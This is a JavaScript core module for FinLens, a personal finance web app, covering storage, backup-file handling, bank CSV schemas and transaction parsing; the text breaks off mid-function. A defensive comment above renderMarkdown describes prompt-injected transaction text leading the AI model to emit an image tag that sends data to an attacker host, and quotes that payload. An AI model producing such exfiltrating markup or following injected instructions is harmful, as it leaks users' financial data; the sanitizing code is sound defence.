/* ================================================================
   FINLENS — core.js
   State, helpers, CSV parsing, date range, account filter.
   Aggregation helpers live in aggregation.js (loaded next).
================================================================ */

/* ---------- helpers ---------- */
const $ = (s, r=document) => r.querySelector(s);
const $$ = (s, r=document) => Array.from(r.querySelectorAll(s));
const fmt = (n) => {
  if (n===null||n===undefined||isNaN(n)) return '—';
  const sign=n<0?'-':''; const v=Math.abs(n);
  return sign+'$'+v.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
};
const fmt0 = (n) => {
  if (n===null||n===undefined||isNaN(n)) return '—';
  const sign=n<0?'-':'';
  return sign+'$'+Math.abs(n).toLocaleString('en-US',{maximumFractionDigits:0});
};
const pct = (n, d=1) => (n===null||isNaN(n)) ? '—' : (n*100).toFixed(d)+'%';
const hash = (s) => {
  let h=0;
  for (let i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}
  return 'tx'+Math.abs(h).toString(36);
};
/* ---------- Plan item ids (v1.16.7) ---------- */
// Budgets, buckets and debts each have a stable `id`, and a transaction's link to one
// (State.txOverrides[txId].link) is { type, id }. Up to v1.16.6 the link held the item's
// list position ({ type, idx }), so deleting an item left the links of the items after it
// pointing at the wrong one. migrate.js rewrites data saved that way (CLAUDE.md §22).
// Link type → [State key, id prefix]
const PLAN_LINK_TYPES = { budget: ['budgets', 'bud'], bucket: ['buckets', 'bkt'], debt: ['debts', 'dbt'] };
// A new id for an item of `type`: its prefix and 10 random base-36 characters
// ('bud_k3x9q0m2zp'), never one already in `list` (default: the State list). An id is a
// name, not a position: once given it never changes.
function newPlanId(type, list) {
  const [key, prefix] = PLAN_LINK_TYPES[type];
  const taken = new Set((list || State[key] || []).map(x => x && x.id));
  for (;;) {
    let s = '';
    try { s = Array.from(crypto.getRandomValues(new Uint8Array(10)), b => (b % 36).toString(36)).join(''); }
    catch (e) { while (s.length < 10) s += Math.random().toString(36).slice(2); s = s.slice(0, 10); }
    const id = prefix + '_' + s;
    if (!taken.has(id)) return id;
  }
}
const lsGet = (k, def) => {
  try { const v=localStorage.getItem('finlens_'+k); return v?JSON.parse(v):def; }
  catch(e){ return def; }
};
const lsSet = (k, v) => {
  localStorage.setItem('finlens_'+k, JSON.stringify(v));
  // Mirror to IndexedDB app_state if DB is ready
  if (typeof DB !== 'undefined' && DB._db) DB.setState(k, v);
  // Auto-save full State to filesystem (debounced)
  if (typeof _saveStateDebounced !== 'undefined') _saveStateDebounced(State);
};
// Removes every finlens_* key from localStorage. Only "Start over" should call this.
const lsClearAll = () => {
  Object.keys(localStorage).filter(k => k.startsWith('finlens_')).forEach(k => localStorage.removeItem(k));
};
// Browser storage (lsSet/lsGet and IndexedDB app_state) keeps two State keys under older
// names; every other key is stored under its State name. Existing data lives under these
// names, so they stay. Code that saves or loads a key by its State name (JSON import,
// Data & reset, DB.loadAll() and the new-database copy, migrate.js) goes through
// storageKey(). finlens-state.json and JSON exports use State names.
const STORAGE_KEYS = { recurringConfirmed: 'recurring', categoryRules: 'catRules' };
const storageKey = (stateKey) => STORAGE_KEYS[stateKey] || stateKey;
const debounce = (fn, ms=300) => { let t; return (...a)=>{ clearTimeout(t); t=setTimeout(()=>fn(...a),ms); }; };
const today = () => new Date(new Date().toDateString());
const startOfMonth = (d=new Date()) => new Date(d.getFullYear(),d.getMonth(),1);
const endOfMonth = (d=new Date()) => new Date(d.getFullYear(),d.getMonth()+1,0,23,59,59);
const monthKey = (d) => `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}`;
const parseDate = (s, format = 'MM/DD/YYYY') => {
  if (!s) return null;
  if (s instanceof Date) return s;
  // Format-aware parsing to avoid ambiguity
  if (typeof s === 'string') {
    if (format === 'MM/DD/YYYY') {
      const m = /^(\d{1,2})\/(\d{1,2})\/(\d{4})$/.exec(s.trim());
      if (m) return new Date(+m[3], +m[1]-1, +m[2]);
    } else if (format === 'DD/MM/YYYY') {
      const m = /^(\d{1,2})\/(\d{1,2})\/(\d{4})$/.exec(s.trim());
      if (m) return new Date(+m[3], +m[2]-1, +m[1]);
    } else if (format === 'YYYY-MM-DD') {
      const m = /^(\d{4})-(\d{2})-(\d{2})$/.exec(s.trim());
      if (m) return new Date(+m[1], +m[2]-1, +m[3]);
    }
  }
  // Fallback: native Date parsing
  const d = new Date(s);
  return isNaN(d) ? null : d;
};
const escapeHtml = (s) => (s||'').replace(/[&<>"']/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[m]);
const escapeAttr = (s) => (s||'').replace(/'/g,"\\'").replace(/"/g,'&quot;');
// Render untrusted Markdown (e.g. Claude's responses) to safe HTML for innerHTML.
// marked converts Markdown → HTML; DOMPurify then strips scripts, event handlers and
// javascript: URLs. Images are forbidden so injected text in a transaction description
// can't make the model emit <img src="https://attacker/?data=..."> to exfiltrate data.
// Falls back to escaped plain text if either CDN library failed to load.
// Never call marked.parse() directly — always go through this helper.
//
// Only ~~double~~ tildes mean strikethrough. marked's GFM mode also strikes through text
// between single tildes, but Claude writes "~" to mean "about": "~3-5% (~$150-245)" came out
// as "3-5% (" struck through. So a single ~ is kept as plain text, and returning false
// hands ~~text~~ (and everything else) to marked's own rule.
if (typeof marked !== 'undefined') marked.use({ tokenizer: {
  del(src) { return src[0] === '~' && src[1] !== '~' ? { type: 'text', raw: '~', text: '~' } : false; },
} });
const renderMarkdown = (md) => {
  const src = md || '';
  if (typeof marked === 'undefined' || typeof DOMPurify === 'undefined') {
    return `<div style="white-space:pre-wrap">${escapeHtml(src)}</div>`;
  }
  return DOMPurify.sanitize(marked.parse(src), {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ['img', 'style', 'form', 'input', 'button', 'textarea', 'select'],
    FORBID_ATTR: ['style'],
  });
};
const downloadFile = (name, content, mime) => {
  const blob = new Blob([content],{type:mime||'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = name;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(()=>URL.revokeObjectURL(a.href), 1000);
};

/* ---------- Filesystem state persistence (source of truth) ---------- */
// Chromium browsers (Edge, Chrome) keep a stored folder's permission only until the
// last FinLens tab closes: a reload keeps it, closing the browser resets it to "prompt",
// and only a click can ask for it again. So the file functions check
// first (queryPermission never prompts) instead of letting getFileHandle() throw
// NotAllowedError. When access has lapsed they set State._folderNeedsAccess, which
// shows the "Reconnect folder" banner (updateFolderBanner() in views-data.js).
async function folderPermission(dir, mode) {
  try { return await dir.queryPermission({ mode }); } catch(e) { return 'denied'; }
}

// Load state from finlens-state.json in the backup folder
async function loadStateFromFile() {
  try {
    const dirHandle = await idbGet('csvDirHandle');
    State._folderLinked = !!dirHandle;   // the app bar's sync badge reads this (views-data.js)
    if (!dirHandle) {
      console.log('[FinLens] No backup folder selected; skipping file load');
      return null;
    }
    // Saving needs read-write; without it backups are paused even if reading works.
    if ((await folderPermission(dirHandle, 'readwrite')) !== 'granted') State._folderNeedsAccess = true;
    if ((await folderPermission(dirHandle, 'read')) !== 'granted') {
      console.log('[FinLens] Folder access needs to be renewed this session; loading from browser storage instead of finlens-state.json');
      return null;
    }
    const fileHandle = await dirHandle.getFileHandle('finlens-state.json');
    const file = await fileHandle.getFile();
    const text = await file.text();
    const loaded = JSON.parse(text);
    // The Anthropic API key never comes from (or goes to) this file. Versions up to
    // v1.7.0 wrote it here in plain text: move it into browser storage if that's the
    // only copy, drop it from the loaded state, and schedule a save so the file is
    // rewritten without it.
    if ('apiKey' in loaded) {
      if (loaded.apiKey && !State.apiKey) { State.apiKey = loaded.apiKey; lsSet('apiKey', loaded.apiKey); }
      delete loaded.apiKey;
      _saveStateDebounced(State);
    }
    // JSON turns each transaction's Date into a string and freezes the `category`
    // getter into a plain value. Rebuild them exactly as DB.loadAll() does, or
    // monthKey()/date comparisons throw or misbehave (Income, Trends, AI summary).
    if (Array.isArray(loaded.transactions)) {
      const ovs = loaded.txOverrides || State.txOverrides || {};
      loaded.transactions = loaded.transactions
        .map(raw => reconstituteTx({ ...raw, description: raw._originalDesc || raw.description }, ovs[raw.id] || {}))
        .filter(t => !isNaN(t.date))
        .sort((a, b) => b.date - a.date);
    }
    // A file written before v1.12.0 (or an old backup) uses the old account codes, and one
    // written before v1.16.7 links transactions to plan items by position: rewrite them
    // (migrate.js) and save the file again once it's loaded.
    const migrated = IdMigration.migrateState(loaded);
    if (migrated.changed.length) _saveStateDebounced(State);
    IdMigration.logPlanLinks(migrated.plan, 'finlens-state.json');
    console.log('[FinLens] State loaded from finlens-state.json');
    return loaded;
  } catch(e) {
    if (e.name !== 'NotFoundError') {
      console.log('[FinLens] File load error:', e.message);
    }
    return null;
  }
}

// Save state to finlens-state.json in the backup folder
async function saveStateToFile(state) {
  // "Start over" sets this so a pending debounced save can't re-create the file
  // between the reset and the page reload.
  if (State._resetInProgress) return false;
  State._lastSaveError = '';
  try {
    const dirHandle = await idbGet('csvDirHandle');
    State._folderLinked = !!dirHandle;
    if (!dirHandle) {
      console.log('[FinLens] No backup folder selected; state not saved to file');
      return false;
    }
    // No write access (lapsed when the browser closed, or only read was granted): skip quietly
    // and show the banner, rather than throwing on every debounced save.
    if ((await folderPermission(dirHandle, 'readwrite')) !== 'granted') {
      State._lastSaveError = 'no write access to the folder';
      if (!State._folderNeedsAccess) {
        State._folderNeedsAccess = true;
        console.log('[FinLens] Backups paused: no write access to the folder');
        if (typeof updateFolderBanner === 'function') updateFolderBanner();
      }
      return false;
    }
    const fileHandle = await dirHandle.getFileHandle('finlens-state.json', { create: true });
    const writable = await fileHandle.createWritable();
    // Serialize State, being careful with non-serializable properties.
    // apiKey is deliberately excluded: secrets stay in browser storage only
    // (localStorage + IndexedDB app_state), never in a plain-text file on disk.
    const serializable = {
      transactions: state.transactions,
      accounts: state.accounts,
      budgets: state.budgets,
      buckets: state.buckets,
      debts: state.debts,
      bills: state.bills,
      recurringConfirmed: state.recurringConfirmed,
      txOverrides: state.txOverrides,
      manualBalances: state.manualBalances,
      categoryRules: state.categoryRules,
      categories: state.categories,
      aiHistory: state.aiHistory,
      scenarios: state.scenarios,
      investAlloc: state.investAlloc,
      debtPlan: state.debtPlan,
      cardDetails: state.cardDetails,
      sampleData: state.sampleData,
      theme: state.theme,
      fileAssignments: state.fileAssignments,
      accountOrder: state.accountOrder,
      accountLabels: state.accountLabels,
      txRules: state.txRules,
      transferKeywords: state.transferKeywords,
      customSchemas: state.customSchemas,
    };
    await writable.write(JSON.stringify(serializable, null, 2));
    await writable.close();
    State.lastFsyncTime = new Date();
    console.log('[FinLens] Auto-saved state to finlens-state.json');
    if (State._folderNeedsAccess) {
      State._folderNeedsAccess = false;
      if (typeof updateFolderBanner === 'function') updateFolderBanner();
    }
    if (typeof updateSyncBadge === 'function') updateSyncBadge();
    return true;
  } catch(e) {
    State._lastSaveError = e.message;
    console.warn('[FinLens] Failed to save state to file:', e.message);
    if (typeof updateSyncBadge === 'function') updateSyncBadge();
    return false;
  }
}

// Debounced state file save (max 1 save per 5 seconds)
const _saveStateDebounced = debounce(async (state) => {
  await saveStateToFile(state);
}, 5000);

/* ---------- Folder + state-file maintenance (Settings → Data & Reset) ---------- */
// Browsers only show a file-permission prompt during a user gesture, so the
// functions that may need write access must be called from a click handler.

// Returns the connected folder handle with read-write access, or null when no folder
// is connected or access was refused.
async function folderWithWriteAccess() {
  const dir = await idbGet('csvDirHandle');
  if (!dir) return null;
  try {
    let perm = await dir.queryPermission({ mode: 'readwrite' });
    if (perm !== 'granted') perm = await dir.requestPermission({ mode: 'readwrite' });
    return perm === 'granted' ? dir : null;
  } catch(e) { return null; }
}

// Writes finlens-state.json right away, e.g. after clearing data, so the next page
// load can't restore what was just cleared from an older file.
// Also used by Settings → Import → Save Now. Must be called from a click handler,
// since it may need to ask for read-write access.
// Returns 'saved', 'no-folder', 'denied' (access refused) or 'error' (the write
// itself failed; the reason is in State._lastSaveError).
async function saveStateNow() {
  if (!(await idbGet('csvDirHandle'))) return 'no-folder';
  if (!(await folderWithWriteAccess())) return 'denied';
  return (await saveStateToFile(State)) ? 'saved' : 'error';
}

// Used by "Start over": retires finlens-state.json so reconnecting the same folder
// later doesn't bring the old state back. 'archive' renames it to
// finlens-state-backup-DDMMYYYY.json (API key stripped; a second reset on the same
// day gets -2, -3, … so an earlier copy is never overwritten); 'delete' removes it.
// CSV files are never touched.
// Returns { status: 'archived'|'deleted'|'none'|'no-folder'|'denied'|'error', name? }.
async function retireStateFile(mode) {
  if (!(await idbGet('csvDirHandle'))) return { status: 'no-folder' };
  const dir = await folderWithWriteAccess();
  if (!dir) return { status: 'denied' };
  let fh;
  try { fh = await dir.getFileHandle('finlens-state.json'); }
  catch(e) { return { status: e.name === 'NotFoundError' ? 'none' : 'error' }; }
  try {
    let name;
    if (mode === 'archive') {
      const text = await (await fh.getFile()).text();
      let out = text;
      try { const obj = JSON.parse(text); delete obj.apiKey; out = JSON.stringify(obj, null, 2); } catch(e) { /* keep raw text */ }
      const exists = async (nm) => { try { await dir.getFileHandle(nm); return true; } catch(e) { return false; } };
      const stamp = dayjs().format('DDMMYYYY');
      name = `finlens-state-backup-${stamp}.json`;
      for (let n = 2; await exists(name); n++) name = `finlens-state-backup-${stamp}-${n}.json`;
      const w = await (await dir.getFileHandle(name, { create: true })).createWritable();
      await w.write(out);
      await w.close();
    }
    await dir.removeEntry('finlens-state.json');
    return { status: mode === 'archive' ? 'archived' : 'deleted', name };
  } catch(e) {
    console.warn('[FinLens] retireStateFile:', e.message);
    return { status: 'error' };
  }
}

// Disconnects the CSV folder: FinLens forgets the stored handle, so it stops
// auto-importing that folder's CSVs and writing finlens-state.json there.
// Nothing on disk is changed.
async function forgetDataFolder() {
  await idbDel('csvDirHandle');
  State._folderLinked = false;
  State.lastFolderName = '';
  State._csvNeedsReconnect = false;
  State._folderNeedsAccess = false;
  State.csvAutoImportPaused = false;
  if (typeof updateFolderBanner === 'function') updateFolderBanner();
  lsSet('lastFolderName', '');
  lsSet('csvAutoImportPaused', false);
}

/* ---------- IndexedDB helpers (for persisting FileSystemDirectoryHandle) ---------- */
function _idbOpen() {
  return new Promise((res, rej) => {
    const req = indexedDB.open('finlens_fs', 1);
    req.onupgradeneeded = e => e.target.result.createObjectStore('kv');
    req.onsuccess = e => res(e.target.result);
    req.onerror = () => rej(req.error);
  });
}
// Each helper opens its own short-lived connection and closes it when done
// (close() waits for the transaction), so finlens_fs can be deleted on reset.
async function idbGet(key) {
  try { const db=await _idbOpen(); return await new Promise(r=>{ const q=db.transaction('kv','readonly').objectStore('kv').get(key); q.onsuccess=()=>r(q.result??null); q.onerror=()=>r(null); db.close(); }); }
  catch(e){ return null; }
}
async function idbSet(key, val) {
  try { const db=await _idbOpen(); await new Promise(r=>{ const q=db.transaction('kv','readwrite').objectStore('kv').put(val,key); q.onsuccess=()=>r(); q.onerror=()=>r(); db.close(); }); }
  catch(e){}
}
async function idbDel(key) {
  try { const db=await _idbOpen(); await new Promise(r=>{ const q=db.transaction('kv','readwrite').objectStore('kv').delete(key); q.onsuccess=()=>r(); q.onerror=()=>r(); db.close(); }); }
  catch(e){}
}
// Deletes a whole IndexedDB database. Resolves 'deleted', 'blocked' (another open
// connection — the delete then completes once it closes) or 'error'.
function deleteIndexedDB(name) {
  return new Promise((res) => {
    const req = indexedDB.deleteDatabase(name);
    req.onsuccess = () => res('deleted');
    req.onerror   = () => res('error');
    req.onblocked = () => res('blocked');
  });
}


/* ---------- AppState ---------- */
const State = {
  transactions: [],
  accounts: {},         // id -> { id, name, kind, balance, limit, sourceFile }
  budgets: lsGet('budgets', []),
  buckets: lsGet('buckets', []),
  debts: lsGet('debts', []),
  bills: lsGet('bills', []),
  recurringConfirmed: lsGet(storageKey('recurringConfirmed'), {}),   // stored as 'recurring'
  txOverrides: lsGet('txOverrides', {}),       // id -> { description, categories, notes, isBill, isRecurring, isSubscription, type, accountOverride, link: { type, id } }
  manualBalances: lsGet('manualBalances', {}),  // id -> amount;  id+'_limit' -> limit;  id+'_initial' -> initial balance
  categoryRules: lsGet(storageKey('categoryRules'), []),            // stored as 'catRules'
  categories: lsGet('categories', null) || [
    'Food & Dining','Groceries','Housing','Transport','Entertainment',
    'Health','Shopping','Bills & Utilities','Subscriptions','Personal',
    'Travel','Income','Transfer','Fees','Other'
  ],
  apiKey: lsGet('apiKey', ''),
  aiHistory: lsGet('aiHistory', []),
  scenarios: lsGet('scenarios', []),            // Forecast → Savings scenarios (CLAUDE.md §4.1)
  investAlloc: lsGet('investAlloc', {}),        // ticker -> user %
  debtPlan: lsGet('debtPlan', { strategy:'avalanche', extra:0 }), // Debt payoff plan: 'avalanche'|'snowball'|'minimum', extra $/mo
  // Settings → Credit cards (v1.16.0): { [cardAccountId]: { apr: number|null, dueDay: number|null } }.
  // A debt linked to the card (State.debts[].account) holds its own APR and due day, which win.
  cardDetails: lsGet('cardDetails', {}),
  // true while the loaded transactions are the synthetic samples/ files ("Try it with sample
  // data" on the Welcome). The next import of your own files clears them first (loadFiles()).
  sampleData: lsGet('sampleData', false),
  range: { mode:'month', start:null, end:null },
  selectedAccounts: 'all',
  theme: lsGet('theme', 'light'),
  lastRefresh: null,
  fileMeta: [],
  pendingFiles: [],      // files waiting for account assignment
  lastFolderName: lsGet('lastFolderName', ''),
  // Set when imported transactions are cleared while a folder is connected, so the next
  // page load doesn't re-import the folder's CSVs. Any import the user starts clears it.
  // Browser storage only, never finlens-state.json: a backup file written before the
  // pause ended (saves are debounced) must not be able to switch it back on.
  csvAutoImportPaused: lsGet('csvAutoImportPaused', false),
  fileAssignments: lsGet('fileAssignments', {}), // filename -> kind
  accountOrder: lsGet('accountOrder', []),        // [accountId, ...] display order
  accountLabels: lsGet('accountLabels', {}),      // accountId -> custom display name (overrides account.name everywhere)
  txRules: lsGet('txRules', []),                  // [{contains, flag:'bill'|'subscription'|'recurring'}] — auto-flag rules
  transferKeywords: lsGet('transferKeywords', null) || ['transfer','zelle','ach','venmo','paypal','coinbase','savings booster'],
  customSchemas: lsGet('customSchemas', []),       // user-defined schema objects (same shape as BANK_SCHEMAS entries)
  currentView: 'overview',
};

/* ---------- DEFAULT TRANSFER KEYWORDS ---------- */
const DEFAULT_TRANSFER_KEYWORDS = ['transfer','zelle','ach','venmo','paypal','coinbase','savings booster'];

/* ---------- BANK SCHEMA REGISTRY ---------- */
// Data-driven normalizer config. Adding a new bank = adding a new object here (or via custom schema UI).
const BANK_SCHEMAS = [
  {
    id: 'bank_checking',
    name: 'Bank Checking',
    kind: 'checking',
    detect: (headers) =>
      headers.includes('Time') &&
      headers.includes('Type') &&
      headers.includes('Amount') &&
      !headers.includes('Transaction Date'),
    columns: {
      date:        'Date',
      time:        'Time',         // Bank-assigned HH:MM:SS — used in hash
      description: 'Description',
      amount:      'Amount',
      type:        'Type',         // 'Withdrawal' | 'Deposit'
    },
    amountSign: 'standard',        // negative = expense, positive = income
    hashFields: ['date', 'time', 'description', 'amount'],
    headerTransform: h => h.trim(),
    allowOccurrenceSuffix: false,
    dateFormat: 'YYYY-MM-DD',
  },
  {
    id: 'bank_savings',
    name: 'Bank Savings',
    kind: 'savings',
    detect: (headers) =>
      headers.includes('Time') &&
      headers.includes('Type') &&
      headers.includes('Amount') &&
      !headers.includes('Transaction Date'),
    // Note: bank_checking and bank_savings share the same CSV format.
    // Filename check ('saving' in name) runs first in detectSchema().
    columns: {
      date:        'Date',
      time:        'Time',
      description: 'Description',
      amount:      'Amount',
      type:        'Type',
    },
    amountSign: 'standard',
    hashFields: ['date', 'time', 'description', 'amount'],
    headerTransform: h => h.trim(),
    allowOccurrenceSuffix: false,
    dateFormat: 'YYYY-MM-DD',
  },
  {
    id: 'credit_card',
    name: 'Bank Credit Card',
    kind: 'credit',
    detect: (headers) =>
      headers.includes('Transaction Date') &&
      headers.includes('Post Date'),
    columns: {
      date:        'Transaction Date',
      postDate:    'Post Date',    // Used in hash
      description: 'Description',
      amount:      'Amount',
      category:    'Category',     // Bank-assigned; used for initial auto-categorization
      type:        'Type',         // 'Sale' | 'Payment' | 'Return'
    },
    amountSign: 'standard',
    hashFields: ['date', 'postDate', 'description', 'amount'],
    allowOccurrenceSuffix: true,   // Required — identical rows occur (e.g. TAXMANIA same-day charges)
    dateFormat: 'YYYY-MM-DD',      // Transaction Date column uses YYYY-MM-DD
    postDateFormat: 'MM/DD/YYYY',  // Post Date column uses MM/DD/YYYY (different format in same file)
  },
];

/* ---------- SCHEMA DETECTION ---------- */
// Returns the best-matching schema for a given set of (already-trimmed) headers + filename.
function detectSchema(headers, filename) {
  const fn = (filename || '').toLowerCase();
  // Filename-based disambiguation for bank checking vs savings (identical column structure)
  if (fn.includes('saving')) return BANK_SCHEMAS.find(s => s.id === 'bank_savings') || null;
  if (fn.includes('check') && !fn.includes('checkout')) return BANK_SCHEMAS.find(s => s.id === 'bank_checking') || null;
  // Credit card by filename (otherwise its Transaction Date + Post Date headers identify it below)
  if (fn.includes('card') || fn.includes('credit')) {
    const s = BANK_SCHEMAS.find(s => s.id === 'credit_card');
    if (s) return s;
  }
  // Header-based detection for all schemas (built-in + custom)
  const allSchemas = [...BANK_SCHEMAS, ...(State.customSchemas || [])];
  for (const schema of allSchemas) {
    if (schema.detect && schema.detect(headers)) return schema;
  }
  return null;
}

/* ---------- GENERIC ROW NORMALIZER ---------- */
// Replaces the per-bank row normalizers of earlier versions.
// `occurrence` (1-based) distinguishes truly identical rows within one file — see parseCsvFile().
function normalizeRow(row, schema, accountId, occurrence = 1) {
  const get = (col) => col && row[col] !== undefined ? row[col].toString().trim() : '';

  const rawDate = get(schema.columns.date);
  const d = parseDate(rawDate, schema.dateFormat || 'MM/DD/YYYY');
  if (!d) return null;

  const postDate = schema.columns.postDate
    ? parseDate(get(schema.columns.postDate), schema.postDateFormat || schema.dateFormat || 'MM/DD/YYYY')
    : null;
  const time = schema.columns.time ? get(schema.columns.time) : '';

  const rawAmt = get(schema.columns.amount).replace(/[$,]/g, '');
  let amt = parseFloat(rawAmt);
  if (isNaN(amt)) return null;
  if (schema.amountSign === 'inverted') amt *= -1;

  const desc = get(schema.columns.description) || '';
  const rawType = (schema.columns.type ? get(schema.columns.type) : '').toLowerCase();
  const rawCat  = schema.columns.category ? get(schema.columns.category) : '';

  let type = amt < 0 ? 'debit' : 'credit';
  if (rawType.includes('payment')) type = 'payment';
  else if (rawType.includes('return')) type = 'credit';
  if (rawType.includes('deposit') || rawType.includes('credit'))  type = 'credit';
  if (rawType.includes('withdraw') || rawType.includes('debit'))  type = 'debit';
  if (rawType.includes('transfer')) type = 'transfer';

  const cat = (rawCat && rawCat !== '') ? rawCat.trim() : autoCategory(desc);

  return mkTx({ date: d, time, postDate, description: desc, amount: amt,
                category: cat, account: accountId, type, occurrence });
}

/* ---------- DEFAULT CATEGORY RULES ---------- */
const DEFAULT_RULES = [
  ['NETFLIX','Subscriptions'],['SPOTIFY','Subscriptions'],['HULU','Subscriptions'],['DISNEY','Subscriptions'],
  ['APPLE.COM','Subscriptions'],['ICLOUD','Subscriptions'],['GOOGLE','Subscriptions'],['PRIME','Subscriptions'],
  ['CHATGPT','Subscriptions'],['OPENAI','Subscriptions'],['ANTHROPIC','Subscriptions'],['MIDJOURNEY','Subscriptions'],
  ['UBER','Transport'],['LYFT','Transport'],['SHELL','Transport'],['EXXON','Transport'],['CHEVRON','Transport'],
  ['STARBUCKS','Food & Dining'],['CHIPOTLE','Food & Dining'],['MCDONALD','Food & Dining'],['DOORDASH','Food & Dining'],
  ['UBER EATS','Food & Dining'],['GRUBHUB','Food & Dining'],
  ['WHOLE FOODS','Groceries'],['TRADER JOE','Groceries'],['SAFEWAY','Groceries'],['KROGER','Groceries'],['ALDI','Groceries'],['WALMART','Groceries'],['PUEBLO','Groceries'],
  ['AMAZON','Shopping'],['TARGET','Shopping'],['BEST BUY','Shopping'],
  ['RENT','Housing'],['MORTGAGE','Housing'],['HOA','Housing'],
  ['ELECTRIC','Bills & Utilities'],['COMCAST','Bills & Utilities'],['XFINITY','Bills & Utilities'],
  ['VERIZON','Bills & Utilities'],['T-MOBILE','Bills & Utilities'],['AT&T','Bills & Utilities'],
  ['WATER','Bills & Utilities'],['GAS COMPANY','Bills & Utilities'],['INTERNET','Bills & Utilities'],
  ['CVS','Health'],['WALGREENS','Health'],['PHARMACY','Health'],
  ['PAYROLL','Income'],['DIRECT DEP','Income'],['SALARY','Income'],['INTEREST','Income'],['HACIENDA','Income'],
  ['ZELLE','Transfer'],['TRANSFER','Transfer'],['ACH','Transfer'],['VENMO','Transfer'],['PAYPAL','Transfer'],['COINBASE','Transfer'],
  ['ATM','Fees'],['FEE','Fees'],['OVERDRAFT','Fees'],['INSUFFICIENT','Fees'],
];

function autoCategory(desc) {
  const u = (desc||'').toUpperCase();
  for (const r of State.categoryRules) {
    if (r.contains && u.includes(r.contains.toUpperCase())) return r.category;
  }
  for (const [k, c] of DEFAULT_RULES) if (u.includes(k)) return c;
  return 'Other';
}

/* Returns true if any txRule with given flag matches the description */
function txRuleFlag(desc, flag) {
  const u = (desc||'').toUpperCase();
  for (const r of (State.txRules||[])) {
    if (r.flag === flag && r.contains && u.includes(r.contains.toUpperCase())) return true;
  }
  return false;
}

/* Apply all txRules to already-loaded transactions (called after adding/removing a rule) */
function applyTxRulesToAll() {
  for (const t of State.transactions) {
    const ov = State.txOverrides[t.id] || {};
    const src = t._originalDesc || t.description;
    if (!('isBill' in ov))         t.isBill         = txRuleFlag(src, 'bill');
    if (!('isSubscription' in ov)) t.isSubscription  = txRuleFlag(src, 'subscription');
    if (!('isRecurring' in ov))    t.isRecurring     = txRuleFlag(src, 'recurring');
  }
}

/* ---------- CSV PARSING ---------- */
function mkTx(o) {
  const dateStr = o.date.toISOString().slice(0,10);
  // Per-source hash strategy (see CLAUDE.md §10):
  // Bank checking/savings: date|time|desc|amount|account  — Time is bank-assigned (HH:MM:SS), eliminates collision risk
  // Credit card: txDate|postDate|desc|amount|account — post date disambiguates same-day identical charges
  // migrate.js relies on this layout (the account id last) to rename account ids.
  let hashKey;
  if (o.time) {
    hashKey = dateStr+'|'+o.time+'|'+o.description+'|'+o.amount+'|'+o.account;
  } else if (o.postDate) {
    const postStr = o.postDate.toISOString().slice(0,10);
    hashKey = dateStr+'|'+postStr+'|'+o.description+'|'+o.amount+'|'+o.account;
  } else {
    hashKey = dateStr+'|'+o.description+'|'+o.amount+'|'+o.account;
  }
  // The 2nd, 3rd, … truly identical row in the same file gets _2, _3, … (assigned in
  // parseCsvFile). The suffix is part of the ID everywhere — memory, IndexedDB, overrides.
  const id = hash(hashKey) + (o.occurrence > 1 ? '_' + o.occurrence : '');
  const ov = State.txOverrides[id] || {};
  const cats = ov.categories && ov.categories.length ? ov.categories : (ov.category ? [ov.category] : [o.category]);
  return {
    id,
    date: o.date,
    description: ov.description || o.description,
    amount: o.amount,
    categories: cats,
    get category(){ return this.categories[0] || 'Other'; },
    account: ov.accountOverride || o.account,
    type: ov.type || o.type,
    isRecurring: 'isRecurring' in ov ? !!ov.isRecurring : txRuleFlag(o.description, 'recurring'),
    isBill: 'isBill' in ov ? !!ov.isBill : txRuleFlag(o.description, 'bill'),
    isSubscription: 'isSubscription' in ov ? !!ov.isSubscription : txRuleFlag(o.description, 'subscription'),
    notes: ov.notes || '',
    balance: null,
    _originalDesc: o.description,
    // The CSV's category and type, before edits and transfer detection (v1.16.1).
    // "Clear transaction edits" restores them from the transaction itself, and the
    // IndexedDB row stores them (DB.importTransactions()). finlens-state.json keeps them.
    _originalCategories: [o.category],
    _originalType: o.type,
  };
}

// Reads one CSV file and turns its rows into transactions. It changes nothing: no State,
// browser storage or IndexedDB writes (v1.16.2). loadFiles() reads every file this way
// first and imports (importParsedCsv()) only when at least one transaction was read.
// Resolves to { file, name, schema, kind, accountId, accountName, rows, txs, problem }:
// `rows` is the file's data rows, `txs` its transactions, and `problem` null or why the
// file gives none: 'unknown-format' (no schema matched its columns or name), 'no-rows'
// (none of its rows has a date and an amount that can be read), 'unreadable' (the
// browser couldn't read it). A file with only a header has no problem and no transactions.
function parseCsvFile(file, forcedKind) {
  return new Promise((resolve) => {
    const out = { file, name: file.name, schema: null, kind: null, accountId: null, accountName: null, rows: 0, txs: [], problem: null };
    Papa.parse(file, {
      header: true,
      skipEmptyLines: true,
      transformHeader: h => h.trim(), // KEY: trim whitespace from bank CSV headers (checking/savings exports have leading spaces)
      complete: (res) => {
        try {
          const rows = res.data || [];
          const headers = rows.length ? Object.keys(rows[0]) : [];
          out.rows = rows.length;

          // Determine schema — forced kind takes precedence over auto-detection
          let schema = null;
          if (forcedKind && forcedKind !== 'unknown' && forcedKind !== 'other') {
            schema = BANK_SCHEMAS.find(s => s.id === forcedKind) || null;
          }
          if (!schema) {
            schema = detectSchema(headers, file.name);
          }
          if (!schema && rows.length) {
            // Final fallback: header content matching
            const lk = headers.map(h => h.toLowerCase());
            if (lk.includes('transaction date') || lk.includes('post date'))
              schema = BANK_SCHEMAS.find(s => s.id === 'credit_card');
            else if (lk.includes('time') && lk.includes('type') && lk.includes('amount'))
              schema = BANK_SCHEMAS.find(s => s.id === 'bank_checking');
          }
          // Unknown schema — skip with warning (Column Mapping UI is a future enhancement)
          if (!schema) {
            console.warn('parseCsvFile: no schema matched for', file.name, '— skipping. Headers:', headers);
            out.problem = 'unknown-format';
            resolve(out);
            return;
          }

          const kind = schema.id;

          // Build accountId and display name (migrate.js maps the ids older versions used)
          let accountId, accountName;
          if (kind === 'credit_card') {
            accountId = 'card_' + file.name.replace(/\.csv$/i,'').toLowerCase().replace(/[^a-z0-9]+/g,'_');
            accountName = 'Bank Credit Card (' + file.name.replace(/\.csv$/i,'') + ')';
